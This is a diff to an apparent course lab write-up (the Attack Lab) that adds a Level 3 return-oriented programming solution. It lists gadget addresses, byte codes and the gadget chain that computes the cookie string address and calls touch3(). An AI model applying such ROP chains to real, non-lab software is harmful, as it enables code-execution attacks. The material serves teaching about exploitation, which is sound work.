@@ -107,6 +107,75 @@ c3          ret
 c3          ret
 ```
 
-Therefore, we need to store three bytes at stack pointer: the address of the first gadget, the cookie data to be popped, and the address of the second gadget. Note that both `ret` and `popq` would increase `rsp`,  so we need to use the upward space. [rtouch2.txt] is a sample input and here is the stack diagram:  
+Therefore, we need to store three bytes at stack pointer: the address of the first gadget, the cookie data to be popped, and the address of the second gadget. Note that both `ret` and `popq` would increase `rsp`,  so we need to use the upward space. [rtouch2.txt](./rtouch2.txt) is a sample input and here is the stack diagram:  
 
 ![](./figures/6.jpg)
+
+### Level 3
+
+![](./figures/7.jpg)
+
+By examing the byte code within gadget farm (`x/296bx 0x401994`), we can extract some executable byte code as shown in figure 7. 
+
+Some useful instructions are as follows:
+
+```assembly
+0x401a06: 48 89 e0 c3 
+          movq %rsp,%rax
+          ret
+          
+0x4019c5: 48 89 c7 90 c3
+          movq %rax,%rdi
+          nop
+          ret
+          
+0x4019cc: 58 90 c3
+					popq %rax
+					nop
+					ret
+					
+0x401a42: 89 c2 84 c0 c3
+          movl %eax,%edx
+          testb %al
+          ret
+          
+0x401a69: 89 d1 08 db c3
+          movl %edx,%ecx
+          orb %bl
+          ret
+          
+0x401a27: 89 ce 38 c0 c3
+          movl %ecx,%esi
+          cmpb %al
+          ret
+          
+0x4019d6: #add_xy()
+          lea (%rdi,%rsi,1),%rax
+          retq
+```
+
+By looking at *farm.c*, we can find a `add_xy()` function after `mid_farm()`. It plays a critical role to calculate the address of our cookie string. 
+
+The procedure is as follows:
+
+```assembly
+# set the base pointer to %rdi
+movq %rsp,%rax
+movq %rax,%rdi
+
+# set the offset to %rsi
+popq %rax					# rax = 0x48
+movl %eax,%edx
+movl %edx,%ecx
+movl %ecx,%esi
+
+# add offset to base pointer to get the correct address
+lea (%rdi,%rsi,1),%rax
+movq %rax,%rdi
+
+# call touch3()
+```
+
+[rtouch3.txt](./rtouch3.txt) is a sample input.
+
+Cheers!
